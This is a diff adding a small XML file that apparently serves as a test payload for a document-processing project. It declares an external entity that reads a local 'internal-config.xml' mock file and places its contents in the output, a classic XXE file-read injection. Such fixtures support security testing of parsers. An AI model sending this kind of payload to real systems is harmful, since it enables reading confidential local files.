@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY xxe SYSTEM "file:///C:/Users/abij9/Documents/Projects/Document%20Processor%20Project/New%20payloads/mock_files/internal-config.xml">
+]>
+<data>
+    <content>&xxe;</content>
+</data>
